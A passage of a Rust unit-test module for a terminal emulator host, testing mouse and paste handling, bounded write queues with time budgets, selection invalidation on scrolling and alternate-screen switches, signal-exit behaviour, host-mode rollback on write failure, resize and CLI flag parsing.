            view_scroll > before,
            "drag on top row should scroll into older history (slow ramp starts at 1 row)"
        );
        assert!(selection.dragged);
        assert!(selection.range().is_some());
        // Free end is absolute row under the pointer after edge pan.
        let expected = emulator.screen().abs_row_at_view(view_scroll, 0);
        assert_eq!(selection.cursor.map(|c| c.row), Some(expected));
    }

    /// mouse input: tracking on + plain wheel → app report, not host pan.
    #[test]
    fn hybrid_plain_wheel_forwards_not_scroll_view() {
        let mut emulator = Emulator::new(8, 3, 100);
        for i in 0..12 {
            let _ = emulator.feed(format!("line{i}\n").as_bytes());
        }
        let _ = emulator.feed(b"\x1b[?1000h\x1b[?1006h");
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut multi = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let up = MouseEvent {
            kind: MouseEventKind::ScrollUp,
            column: 0,
            row: 0,
            modifiers: KeyModifiers::NONE,
        };
        handle_mouse(
            up,
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("ok");
        assert_eq!(
            view_scroll, 0,
            "plain wheel with tracking must not pan host"
        );
        let bytes = rx.try_recv().expect("wheel SGR");
        assert_eq!(&*bytes, b"\x1b[<64;1;1M");
    }

    /// paste over 1 MiB is truncated, never panics, still single-wraps.
    /// With chunking, drain all chunks (consumer) so the full capped
    /// payload can enqueue under PASTE_SEND_BUDGET.
    #[test]
    fn paste_payload_capped_at_one_mib() {
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(8);
        let huge = "a".repeat(MAX_PASTE_BYTES + 4096);
        let expected_len = MAX_PASTE_BYTES + 12;
        let consumer = thread::spawn(move || {
            let mut got = Vec::new();
            while got.len() < expected_len {
                match rx.recv_timeout(Duration::from_millis(500)) {
                    Ok(chunk) => got.extend_from_slice(&chunk.bytes),
                    Err(_) => break,
                }
            }
            got
        });
        let result = handle_paste(&huge, true, &tx);
        assert_eq!(result, PasteEnqueueResult::Queued);
        let bytes = consumer.join().expect("consumer");
        // Wrapper is 6 + payload + 6.
        assert_eq!(bytes.len(), MAX_PASTE_BYTES + 12);
        assert_eq!(&bytes[..6], b"\x1b[200~");
        assert_eq!(&bytes[bytes.len() - 6..], b"\x1b[201~");
        assert!(bytes[6..bytes.len() - 6].iter().all(|&b| b == b'a'));
    }

    /// sticky read error is not overwritten by clean disconnect.
    #[test]
    fn pending_child_exit_error_not_overwritten_by_clean() {
        let mut pending: Option<Option<io::Error>> = None;
        note_child_read_error(
            &mut pending,
            io::Error::new(io::ErrorKind::BrokenPipe, "pty read failed"),
        );
        assert!(matches!(pending, Some(Some(_))));
        note_clean_child_exit(&mut pending);
        match pending {
            Some(Some(e)) => assert_eq!(e.kind(), io::ErrorKind::BrokenPipe),
            other => panic!("error must remain sticky, got {other:?}"),
        }
        // Clean-only path still records success.
        let mut clean: Option<Option<io::Error>> = None;
        note_clean_child_exit(&mut clean);
        assert!(matches!(clean, Some(None)));
        note_clean_child_exit(&mut clean);
        assert!(matches!(clean, Some(None)));
    }

    /// paste larger than one chunk is split and fully delivered when
    /// the writer drains between chunks.
    #[test]
    fn paste_chunks_across_queue_and_reassembles() {
        // Capacity 1: only one chunk can sit in the queue at a time.
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(1);
        let payload: String = "A".repeat(PASTE_CHUNK_BYTES + 100);
        let expected_len = payload.len();
        let consumer = thread::spawn(move || {
            let mut got = Vec::new();
            while got.len() < expected_len {
                match rx.recv_timeout(Duration::from_millis(500)) {
                    Ok(chunk) => got.extend_from_slice(&chunk.bytes),
                    Err(_) => break,
                }
            }
            got
        });
        let result = handle_paste(&payload, false, &tx);
        assert_eq!(result, PasteEnqueueResult::Queued);
        let got = consumer.join().expect("consumer");
        assert_eq!(got, payload.as_bytes());
    }

    /// full queue + no consumer → paste reports Dropped within budget,
    /// does not hang the event loop.
    #[test]
    fn paste_reports_dropped_quickly_when_queue_full_and_stuck() {
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(1);
        tx.try_send(ChildWrite::bytes(vec![0])).unwrap(); // fill the only slot
        let start = std::time::Instant::now();
        let result = handle_paste("will-not-fit", false, &tx);
        let elapsed = start.elapsed();
        assert_eq!(result, PasteEnqueueResult::Dropped);
        assert!(
            elapsed < test_time_budget(PASTE_SEND_BUDGET + Duration::from_millis(200)),
            "paste drop must stay within budget, elapsed={elapsed:?}"
        );
        assert!(
            elapsed >= Duration::from_millis(10),
            "expected a brief wait against a full queue, elapsed={elapsed:?}"
        );
    }

    /// enqueue helper returns Partial when budget expires mid-stream.
    #[test]
    fn enqueue_paste_chunks_partial_when_budget_expires() {
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(1);
        // Fill queue so the first send_timeout must wait.
        tx.try_send(ChildWrite::bytes(vec![0xff])).unwrap();
        let big = vec![b'x'; PASTE_CHUNK_BYTES * 3];
        // Tiny budget: after the free slot appears once, remaining budget is zero
        // before further chunks — or Timeout on first if we never free.
        // Free one slot after a short delay so one chunk lands, then stall.
        let feeder = thread::spawn(move || {
            thread::sleep(Duration::from_millis(30));
            let _ = rx.recv(); // free the filler
                               // Do not drain further — subsequent chunks block until budget ends.
            thread::sleep(Duration::from_millis(500));
            // Drain whatever arrived so the join is clean.
            let mut n = 0;
            while rx.try_recv().is_ok() {
                n += 1;
            }
            n
        });
        let result = enqueue_paste_chunks(&tx, &big, Duration::from_millis(80));
        let _ = feeder.join();
        assert!(
            matches!(
                result,
                PasteEnqueueResult::Partial | PasteEnqueueResult::Dropped
            ),
            "expected Partial or Dropped under tight budget, got {result:?}"
        );
    }

    /// A burst of more than one queue's capacity is coalesced and delivered
    /// exactly once the writer makes room. The single budget covers the burst.
    #[test]
    fn key_burst_coalesces_and_reassembles_without_loss() {
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(1);
        let expected: Vec<u8> = (0..60).map(|i| b'a' + (i % 26) as u8).collect();
        tx.try_send(ChildWrite::bytes(vec![0xff])).unwrap();
        let consumer = thread::spawn(move || {
            assert_eq!(rx.recv().unwrap().bytes, vec![0xff]);
            rx.recv_timeout(KEY_SEND_BUDGET + Duration::from_millis(200))
                .expect("coalesced key burst")
                .bytes
        });
        let mut pending = Vec::with_capacity(KEY_BURST_MAX_BYTES);
        for byte in &expected {
            queue_key_bytes(&mut pending, vec![*byte], &tx);
        }
        flush_pending_key_bytes(&mut pending, &tx);
        assert!(pending.is_empty());
        assert_eq!(consumer.join().expect("consumer"), expected);
    }

    /// A full queue with no consumer still bounds the key-burst enqueue.
    #[test]
    fn key_burst_reports_drop_within_budget_when_queue_stuck() {
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(1);
        tx.try_send(ChildWrite::bytes(vec![0])).unwrap();
        let mut pending = vec![b'x'; 60];
        let start = Instant::now();
        flush_pending_key_bytes(&mut pending, &tx);
        let elapsed = start.elapsed();
        assert!(pending.is_empty());
        assert!(
            elapsed < test_time_budget(KEY_SEND_BUDGET + Duration::from_millis(200)),
            "key burst drop must stay within budget, elapsed={elapsed:?}"
        );
    }

    /// Event::Paste flushes the 4 KiB / 250 ms key burst first. The paste
    /// ChildWrite then starts with CSI 200~ so typed bytes cannot land inside
    /// the wrappers (`queue_key_bytes` / `flush_pending_key_bytes` boundary).
    #[test]
    fn pending_key_burst_flushes_before_bracketed_paste() {
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut pending = Vec::with_capacity(KEY_BURST_MAX_BYTES);
        queue_key_bytes(&mut pending, b"ab".to_vec(), &tx);
        queue_key_bytes(&mut pending, b"c".to_vec(), &tx);
        assert_eq!(pending, b"abc");
        assert!(
            rx.try_recv().is_err(),
            "keys stay in the burst until the paste boundary flush"
        );

        flush_pending_key_bytes(&mut pending, &tx);
        assert!(pending.is_empty());
        assert_eq!(handle_paste("hi", true, &tx), PasteEnqueueResult::Queued);

        let keys = rx.try_recv().expect("flushed key burst");
        assert_eq!(keys.bytes, b"abc");
        let paste = rx.try_recv().expect("bracketed paste");
        assert_eq!(
            &paste.bytes[..6],
            b"\x1b[200~",
            "paste message must begin with CSI 200~, got {:?}",
            paste.bytes
        );
        assert!(paste.bytes.windows(2).any(|window| window == b"hi"));
        assert!(rx.try_recv().is_err());
    }

    /// Host policy: viewport selection is invalidated via content_epoch on scroll.
    #[test]
    fn selection_cleared_when_primary_scrolls() {
        let mut emulator = Emulator::new(4, 2, 10);
        let _ = emulator.feed(b"aaaa\r\nbbbb");
        let mut selection = Selection::default();
        selection.begin(0, 0);
        selection.update(0, 3);
        selection.finish();
        assert!(selection.range().is_some());
        let before = emulator.screen().content_epoch();
        let _ = emulator.feed(b"\r\ncccc\r\ndddd\r\n");
        let after = emulator.screen().content_epoch();
        assert!(after > before);
        if after != before {
            selection.clear();
        }
        assert!(selection.range().is_none());
    }

    /// DECSTBM margin scroll (not full-screen) must still invalidate selection.
    #[test]
    fn selection_cleared_on_margin_scroll() {
        let mut emulator = Emulator::new(2, 4, 0);
        let _ = emulator.feed(b"\x1b[2;3r");
        let mut selection = Selection::default();
        selection.begin(1, 0);
        selection.update(1, 1);
        selection.finish();
        let before = emulator.screen().content_epoch();
        // Cursor to bottom of region (1-based row 3 → zero-based 2) then LF.
        let _ = emulator.feed(b"\x1b[3;1H\n");
        let after = emulator.screen().content_epoch();
        assert!(after > before, "margin scroll must bump content_epoch");
        if after != before {
            selection.clear();
        }
        assert!(selection.range().is_none());
    }

    /// Enter+leave alt in one feed must invalidate even if final alt_active is false.
    #[test]
    fn selection_cleared_on_same_chunk_alt_roundtrip() {
        let mut emulator = Emulator::new(4, 1, 0);
        let _ = emulator.feed(b"host");
        let mut selection = Selection::default();
        selection.begin(0, 0);
        selection.update(0, 3);
        selection.finish();
        let before = emulator.screen().content_epoch();
        let _ = emulator.feed(b"\x1b[?1049h\x1b[?1049l");
        assert!(!emulator.screen().alt_active());
        let after = emulator.screen().content_epoch();
        assert!(after > before);
        if after != before {
            selection.clear();
        }
        assert!(selection.range().is_none());
    }

    /// Host policy: selection is invalidated across alternate-screen transitions.
    #[test]
    fn selection_cleared_on_alt_screen_toggle() {
        let mut emulator = Emulator::new(4, 1, 0);
        let _ = emulator.feed(b"host");
        let mut selection = Selection::default();
        selection.begin(0, 0);
        selection.update(0, 3);
        selection.finish();
        assert!(selection.range().is_some());
        let before = emulator.screen().content_epoch();
        let _ = emulator.feed(b"\x1b[?1049h");
        let after = emulator.screen().content_epoch();
        assert!(after > before);
        if after != before {
            selection.clear();
        }
        assert!(selection.range().is_none());
    }

    /// Host→child **control** path (capability, focus, mouse) must not block:
    /// `try_send` drops when full. Keys use the 4 KiB / 250 ms burst queue
    /// (`key_burst_*`). Paste uses `PASTE_SEND_BUDGET` (`paste_*`).
    #[test]
    fn host_to_child_control_try_send_is_nonblocking_when_full() {
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(1);
        assert!(tx.try_send(ChildWrite::bytes(vec![1])).is_ok());
        // Second send must not block the event loop — Err is acceptable drop.
        assert!(tx.try_send(ChildWrite::bytes(vec![2])).is_err());
        assert_eq!(rx.try_recv().unwrap(), vec![1]);
    }

    /// after feed of CSI 6 n, host drains CPR bytes onto to_child (no real PTY).
    #[test]
    fn dsr_cpr_feed_drains_reply_to_child_queue() {
        let mut emulator = Emulator::new(80, 24, 0);
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);
        let _ = emulator.feed(b"\x1b[2;4H\x1b[6n");
        drain_emulator_replies(&mut emulator, &tx);
        let reply = rx.try_recv().expect("CPR reply queued to child");
        assert_eq!(reply, b"\x1b[2;4R");
        assert!(rx.try_recv().is_err());
        assert!(emulator.take_pending_replies().is_empty());
    }

    /// Child→host queue is capacity-bounded (backpressure, not unbounded heap).
    #[test]
    fn from_pty_queue_capacity_is_bounded() {
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(FROM_PTY_QUEUE_CAP);
        for i in 0..FROM_PTY_QUEUE_CAP {
            assert!(tx.try_send(ChildWrite::bytes(vec![i as u8])).is_ok());
        }
        assert!(tx.try_send(ChildWrite::bytes(vec![255])).is_err());
        let mut n = 0;
        while rx.try_recv().is_ok() {
            n += 1;
        }
        assert_eq!(n, FROM_PTY_QUEUE_CAP);
    }

    /// Primary rich overlays must not be composed while the child is on alt.
    #[test]
    fn paint_policy_skips_primary_overlays_on_alt() {
        let mut emulator = Emulator::new_experimental(12, 2, 0);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);
        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 1),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &query);
        test_apply_queued_capability_grants(&rx, &mut rich);
        let attach = encode_attach_cell_rect(&AttachCellRect {
            id: 1,
            row: 0,
            col: 0,
            rows: 1,
            cols: 4,
            text: "STAT".into(),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &attach);
        assert_eq!(rich.attachments.len(), 1);
        let _ = emulator.feed(b"\x1b[?1049h");
        assert!(emulator.screen().alt_active());
        // Host paint policy: on alt, overlays_from is not used for composition.
        let on_alt = emulator.screen().alt_active();
        let overlays = if on_alt {
            Vec::new()
        } else {
            overlays_from(&rich.attachments, emulator.screen().rows())
        };
        assert!(overlays.is_empty());
        // Primary still holds the attachment for resume after leave.
        assert_eq!(rich.attachments.len(), 1);
    }

    /// F2 / ownership swap is single-winner so Drop + signal path cannot
    /// double-restore (second call is a pure no-op).
    #[test]
    fn take_host_terminal_ownership_is_idempotent() {
        let owned = AtomicBool::new(true);
        assert!(take_host_terminal_ownership(&owned));
        assert!(!take_host_terminal_ownership(&owned));
        assert!(!take_host_terminal_ownership(&owned));
        // Re-claim simulates a fresh enter; only the next take wins again.
        owned.store(true, Ordering::SeqCst);
        assert!(take_host_terminal_ownership(&owned));
        assert!(!take_host_terminal_ownership(&owned));
    }

    /// F2 / installer is once-safe and must not panic when re-entered.
    #[test]
    fn install_terminal_signal_handlers_is_reentrant() {
        install_terminal_signal_handlers();
        install_terminal_signal_handlers();
        // Fresh process starts with no signal exit request.
        assert!(
            !signal_exit_requested(),
            "install must not set SIGNAL_REQUESTED_EXIT"
        );
    }

    /// F2 hang: signal cooperative exit must not gate TTY restore on a
    /// blocking `session.wait()`. Live interactive children (shell, `sleep`,
    /// editor) stay up after SIGTERM/SIGHUP/SIGINT to prism only — waiting would
    /// prevent `TerminalGuard` Drop from running. Contract encoded here so a
    /// reintroduction of wait-on-signal fails review with a focused unit check.
    /// (Child-EOF path may still wait; that is a separate branch. No global flag
    /// mutation — parallel-safe.)
    #[test]
    fn signal_exit_must_not_block_on_child_wait() {
        // Policy pure function mirroring main's signal branch vs EOF branch:
        // signal → return immediately (no wait); child-EOF → wait then return.
        fn should_wait_for_child_before_return(signal_exit: bool) -> bool {
            !signal_exit
        }
        assert!(
            !should_wait_for_child_before_return(true),
            "signal-exit path must return without session.wait()"
        );
        assert!(
            should_wait_for_child_before_return(false),
            "normal child-EOF path may wait after EOF"
        );
    }

    /// F2 flood: continuous from-PTY messages must not starve signal exit.
    /// Mirrors the main-loop drain: check the flag every message and stop after
    /// `MAX_PTY_DRAIN_PER_TICK` so the outer loop (and Drop) stay reachable when
    /// the bounded queue stays non-empty under flood. Parallel-safe (local flag).
    #[test]
    fn pty_drain_observes_signal_under_continuous_flood() {
        let (tx, rx) = mpsc::sync_channel::<std::io::Result<Vec<u8>>>(FROM_PTY_QUEUE_CAP);
        for i in 0..FROM_PTY_QUEUE_CAP {
            tx.try_send(Ok(vec![i as u8])).expect("prefill");
        }
        // Keep sender alive so Disconnected does not end the drain early.
        let _hold = tx;

        let signal = AtomicBool::new(false);
        let mut total_drained = 0usize;
        let mut signal_exit = false;

        // One outer-loop iteration shaped like main's drain.
        if signal.load(Ordering::SeqCst) {
            signal_exit = true;
        } else {
            let mut drained = 0usize;
            loop {
                if signal.load(Ordering::SeqCst) {
                    signal_exit = true;
                    break;
                }
                if drained >= MAX_PTY_DRAIN_PER_TICK {
                    break;
                }
                match rx.try_recv() {
                    Ok(Ok(bytes)) if bytes.is_empty() => {}
                    Ok(Ok(_bytes)) => {
                        drained += 1;
                        total_drained += 1;
                        // Signal arrives mid-flood (after first chunk).
                        if total_drained == 1 {
                            signal.store(true, Ordering::SeqCst);
                        }
                    }
                    Ok(Err(_)) => break,
                    Err(mpsc::TryRecvError::Empty) | Err(mpsc::TryRecvError::Disconnected) => {
                        break;
                    }
                }
            }
        }

        assert!(
            signal_exit,
            "drain must observe signal flag while queue stays non-empty"
        );
        assert!(
            total_drained < FROM_PTY_QUEUE_CAP,
            "must not fully drain the flood before exiting on signal (drained={total_drained})"
        );
        // Remaining messages still queued — proves we did not run unbounded drain.
        assert!(
            rx.try_recv().is_ok(),
            "queue should still hold undrained flood"
        );
    }

    /// F2 flood: drain budget must yield even when the queue is full so
    /// paint and signal checks always get a turn under continuous refill.
    #[test]
    fn pty_drain_budget_yields_before_queue_empty() {
        // Compile-time: budget must be strictly below queue cap (clippy forbids
        // assert! on pure constants under -D warnings).
        const _: () = assert!(MAX_PTY_DRAIN_PER_TICK < FROM_PTY_QUEUE_CAP);
        let (tx, rx) = mpsc::sync_channel::<std::io::Result<Vec<u8>>>(FROM_PTY_QUEUE_CAP);
        for i in 0..FROM_PTY_QUEUE_CAP {
            tx.try_send(Ok(vec![i as u8])).expect("prefill");
        }
        let _hold = tx;

        let mut drained = 0usize;
        loop {
            if drained >= MAX_PTY_DRAIN_PER_TICK {
                break;
            }
            match rx.try_recv() {
                Ok(Ok(_)) => drained += 1,
                Ok(Err(_)) | Err(_) => break,
            }
        }
        assert_eq!(drained, MAX_PTY_DRAIN_PER_TICK);
        // Queue still non-empty → without the budget the loop would never return.
        assert!(rx.try_recv().is_ok());
    }

    /// F2: successful enter then leave emits leave sequences (injected writer).
    #[test]
    fn enter_host_modes_normal_leave_emits_rollback_sequences() {
        let mut out = Vec::<u8>::new();
        enter_host_modes(&mut out).expect("enter");
        leave_host_modes_best_effort(&mut out);
        let s = String::from_utf8_lossy(&out);
        // LeaveAlternateScreen / Show / DisableMouseCapture are CSI sequences.
        assert!(s.contains("\u{1b}["), "expected CSI in host modes: {s:?}");
        assert!(out.len() > 10);
    }

    /// F2: writer EIO on first byte still best-effort leave (no panic).
    #[test]
    fn enter_host_modes_eio_on_first_write_returns_err() {
        struct FailWriter;
        impl Write for FailWriter {
            fn write(&mut self, _: &[u8]) -> io::Result<usize> {
                Err(io::Error::new(io::ErrorKind::BrokenPipe, "injected EIO"))
            }
            fn flush(&mut self) -> io::Result<()> {
                Ok(())
            }
        }
        let err = enter_host_modes(&mut FailWriter).expect_err("must fail");
        assert_eq!(err.kind(), io::ErrorKind::BrokenPipe);
    }

    /// F2: partial prefix write then failure rolls back with full leave sequence.
    #[test]
    fn enter_host_modes_rolls_back_on_partial_write() {
        struct LimitedWriter {
            buf: Vec<u8>,
            limit: usize,
        }
        impl Write for LimitedWriter {
            fn write(&mut self, data: &[u8]) -> io::Result<usize> {
                if self.buf.len() >= self.limit {
                    return Err(io::Error::other("injected partial fail"));
                }
                let room = self.limit - self.buf.len();
                let n = data.len().min(room);
                self.buf.extend_from_slice(&data[..n]);
                if n == 0 {
                    return Err(io::Error::other("injected partial fail"));
                }
                Ok(n)
            }
            fn flush(&mut self) -> io::Result<()> {
                Ok(())
            }
        }
        // Allow only a few bytes so enter fails mid-sequence; leave still attempted.
        let mut w = LimitedWriter {
            buf: Vec::new(),
            limit: 8,
        };
        assert!(enter_host_modes(&mut w).is_err());
        // Rollback may have appended leave CSI after the partial prefix.
        assert!(!w.buf.is_empty());
    }

    /// F2: fail-once after a successful enter prefix, then recover — rollback must
    /// emit leave-alt / show / disable-mouse CSI on the same writer.
    #[test]
    fn enter_host_modes_fail_once_then_rollback_emits_leave_bytes() {
        struct FailOnceRecover {
            calls: u32,
            failed: bool,
            buf: Vec<u8>,
        }
        impl Write for FailOnceRecover {
            fn write(&mut self, data: &[u8]) -> io::Result<usize> {
                // First write succeeds (EnterAlternateScreen). Fail exactly once
                // on the next write (Hide or mouse), then accept rollback bytes.
                self.calls += 1;
                if self.calls == 2 && !self.failed {
                    self.failed = true;
                    return Err(io::Error::other("injected fail-once"));
                }
                self.buf.extend_from_slice(data);
                Ok(data.len())
            }
            fn flush(&mut self) -> io::Result<()> {
                Ok(())
            }
        }
        let mut w = FailOnceRecover {
            calls: 0,
            failed: false,
            buf: Vec::new(),
        };
        assert!(enter_host_modes(&mut w).is_err());
        assert!(w.failed, "fail-once path must have triggered");
        let s = String::from_utf8_lossy(&w.buf);
        assert!(
            s.contains("\u{1b}[") && w.buf.len() > 4,
            "rollback must emit leave CSI bytes, got {s:?}"
        );
        assert!(
            s.contains("?1049l")
                || s.contains("?25h")
                || s.contains("?1000l")
                || s.contains("?1002l")
                || s.contains("?1003l")
                || s.contains("?1006l"),
            "expected host leave-mode CSI in rollback buffer: {s:?}"
        );
    }

    /// F3: fail-closed resize leaves grid dimensions untouched on PTY error.
    #[test]
    fn host_resize_fail_closed_skips_grid_mutation() {
        let mut emulator = Emulator::new(8, 4, 0);
        let _ = emulator.feed(b"hello");
        let cols = emulator.screen().columns();
        let rows = emulator.screen().rows();
        let mut mutated = false;
        let ok = apply_host_resize_fail_closed(
            || Err(anyhow::anyhow!("simulated PTY resize failure")),
            || {
                emulator.resize(40, 12);
                mutated = true;
            },
        );
        assert!(!ok);
        assert!(!mutated);
        assert_eq!(emulator.screen().columns(), cols);
        assert_eq!(emulator.screen().rows(), rows);

        let ok = apply_host_resize_fail_closed(
            || Ok(()),
            || {
                emulator.resize(40, 12);
                mutated = true;
            },
        );
        assert!(ok && mutated);
        assert_eq!(emulator.screen().columns(), 40);
        assert_eq!(emulator.screen().rows(), 12);
    }

    /// F4: primary overlay absent on alt; resumes after leave alt.
    #[test]
    fn paint_policy_primary_overlay_absent_on_alt_then_resumes() {
        let mut emulator = Emulator::new_experimental(12, 2, 0);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);
        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 1),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &query);
        test_apply_queued_capability_grants(&rx, &mut rich);
        let attach = encode_attach_cell_rect(&AttachCellRect {
            id: 1,
            row: 0,
            col: 0,
            rows: 1,
            cols: 4,
            text: "STAT".into(),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &attach);
        assert_eq!(rich.attachments.len(), 1);

        let paint_overlays = |emulator: &Emulator, rich: &RichSession| {
            if emulator.screen().alt_active() {
                Vec::new()
            } else {
                overlays_from(&rich.attachments, emulator.screen().rows())
            }
        };

        assert!(!paint_overlays(&emulator, &rich).is_empty());
        let _ = emulator.feed(b"\x1b[?1049h");
        assert!(paint_overlays(&emulator, &rich).is_empty());
        let _ = emulator.feed(b"\x1b[?1049l");
        let resumed = paint_overlays(&emulator, &rich);
        assert_eq!(resumed.len(), 1);
        assert_eq!(resumed[0].text, "STAT");
    }

    /// F8: child→host bounded queue applies backpressure (blocking send waits).
    #[test]
    fn from_pty_backpressure_blocks_sender_until_drained() {
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(1);
        tx.send(ChildWrite::bytes(vec![1])).unwrap();
        let handle = thread::spawn(move || {
            tx.send(ChildWrite::bytes(vec![2])).unwrap(); // blocks until capacity frees
        });
        thread::sleep(Duration::from_millis(40));
        assert!(
            !handle.is_finished(),
            "sender should block under backpressure"
        );
        assert_eq!(rx.recv().unwrap(), vec![1]);
        handle.join().unwrap();
        assert_eq!(rx.recv().unwrap(), vec![2]);
    }

    /// F8: non-reading child — control-path `try_send` stays responsive.
    /// Keys use the 4 KiB / 250 ms burst queue (`key_burst_*` tests).
    #[test]
    fn non_reading_child_control_try_send_returns_quickly_when_full() {
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(1);
        tx.try_send(ChildWrite::bytes(vec![0])).unwrap();
        let start = std::time::Instant::now();
        for _ in 0..1000 {
            let _ = tx.try_send(ChildWrite::bytes(vec![1]));
        }
        assert!(
            start.elapsed() < test_time_budget(Duration::from_millis(200)),
            "try_send must not stall the host event loop"
        );
    }

    /// Contract: data + empty-EOF in one queue must paint before treating child as done.
    #[test]
    fn queued_data_then_eof_requires_paint_before_exit() {
        let (tx, rx) = mpsc::sync_channel::<std::io::Result<Vec<u8>>>(4);
        tx.send(Ok(b"HELLO_PHASE1".to_vec())).unwrap();
        tx.send(Ok(Vec::new())).unwrap(); // EOF sentinel
        drop(tx);

        let mut emulator = Emulator::new(40, 5, 0);
        let mut needs_paint = false;
        let mut pending_exit = false;
        loop {
            match rx.try_recv() {
                Ok(Ok(bytes)) if bytes.is_empty() => pending_exit = true,
                Ok(Ok(bytes)) => {
                    let _ = emulator.feed(&bytes);
                    needs_paint = true;
                }
                Ok(Err(_)) => pending_exit = true,
                Err(mpsc::TryRecvError::Empty) | Err(mpsc::TryRecvError::Disconnected) => break,
            }
        }
        assert!(needs_paint, "data before EOF must mark needs_paint");
        assert!(pending_exit, "empty EOF must mark pending exit");
        let text = PlainTextRenderer::render(emulator.screen());
        assert!(
            text.contains("HELLO_PHASE1"),
            "final paint must show fast-child output: {text:?}"
        );
    }

    #[test]
    fn zero_sized_synthetic_terminal_gets_a_usable_fallback() {
        assert_eq!(usable_terminal_size((0, 0)), (80, 24));
        assert_eq!(usable_terminal_size((132, 0)), (132, 24));
    }

    /// geometry is hard-capped; zero still falls back before cap.
    #[test]
    fn usable_terminal_size_caps_geometry() {
        assert_eq!(
            usable_terminal_size((u16::MAX, u16::MAX)),
            (MAX_TERM_COLS, MAX_TERM_ROWS)
        );
        assert_eq!(
            usable_terminal_size((513, 257)),
            (MAX_TERM_COLS, MAX_TERM_ROWS)
        );
        assert_eq!(usable_terminal_size((512, 256)), (512, 256));
        assert_eq!(usable_terminal_size((80, 24)), (80, 24));
        assert_eq!(usable_terminal_size((0, 1000)), (80, MAX_TERM_ROWS));
        assert_eq!(usable_terminal_size((1000, 0)), (MAX_TERM_COLS, 24));
    }

    #[test]
    fn experimental_flag_defaults_off_without_env() {
        let key = "PRISMATTYC_EXPERIMENTAL_RICH";
        let previous = env::var_os(key);
        env::remove_var(key);
        let cli = Cli::parse(vec![std::ffi::OsString::from("/bin/sh")]).unwrap();
        assert!(!cli.experimental_rich);
        match previous {
            Some(value) => env::set_var(key, value),
            None => env::remove_var(key),
        }
    }

    #[test]
    fn scroll_chip_env_defaults_on_and_opt_out() {
        let key = "PRISMATTYC_SCROLL_CHIP";
        let previous = env::var_os(key);
        env::remove_var(key);
        assert!(env_flag_enabled_default_true(key));
        env::set_var(key, "0");
        assert!(!env_flag_enabled_default_true(key));
        env::set_var(key, "false");
        assert!(!env_flag_enabled_default_true(key));
        env::set_var(key, "1");
        assert!(env_flag_enabled_default_true(key));
        match previous {
            Some(value) => env::set_var(key, value),
            None => env::remove_var(key),
        }
    }

    #[test]
    fn cli_double_dash_separator_still_takes_program() {
        let cli = Cli::parse(
            ["--", "/usr/bin/printf", "HELLO_PHASE1"]
                .into_iter()
                .map(std::ffi::OsString::from),
        )
        .unwrap();
        assert_eq!(cli.program, "/usr/bin/printf");
        assert_eq!(
            cli.child_args,
            vec![std::ffi::OsString::from("HELLO_PHASE1")]
        );
        assert!(!cli.experimental_rich);
    }

    #[test]
    fn experimental_cli_flag_enables_rich() {
        let key = "PRISMATTYC_EXPERIMENTAL_RICH";
        let previous = env::var_os(key);
        env::remove_var(key);
        let cli = Cli::parse(vec![
            std::ffi::OsString::from("--experimental-rich"),
            std::ffi::OsString::from("/bin/sh"),
        ])
        .unwrap();
        assert!(cli.experimental_rich);
        match previous {
            Some(value) => env::set_var(key, value),
            None => env::remove_var(key),
        }
    }

    #[test]
    fn classic_status_task_works_without_experimental_path() {
        let mut emulator = Emulator::new(20, 2, 10);
        assert!(!emulator.collects_apc());
        let events = emulator.feed(b"status:ok\r\n");
        assert!(events.is_empty());
        let text = PlainTextRenderer::render(emulator.screen());
        assert!(text.contains("status:ok"));
    }

    #[test]
    fn experimental_off_ignores_capability_queries() {
        let mut emulator = Emulator::new(40, 2, 10);
        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 1),
        })
        .unwrap();
        let events = emulator.feed(&query);
        assert!(events.is_empty());
    }

    #[test]
    fn classic_prism_drops_semantic_snapshot_and_copy() {
        let mut emulator = Emulator::new_experimental(40, 4, 10);
        let mut rich = RichSession::default();
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);
        let snapshot = encode_semantic_snapshot(&SemanticDocument {
            surface_generation: 1,
            document_id: "diag".into(),
            rev: 2,
            text: "error crates/foo.rs:10:1".into(),
            spans: vec![SemanticSpan {
                start: 6,
                end: 24,
                role: SemanticRole::Location,
            }],
            selection: Some(SemanticRange {
                rev: 2,
                start: 6,
                end: 24,
            }),
        })
        .unwrap();
        let copy = encode_semantic_copy(&SemanticCopy {
            surface_generation: 1,
            document_id: "diag".into(),
            rev: 2,
            start: 6,
            end: 24,
        })
        .unwrap();
        let events = emulator.feed(&snapshot);
        handle_control_events(&events, &mut rich, &tx);
        let events = emulator.feed(&copy);
        handle_control_events(&events, &mut rich, &tx);
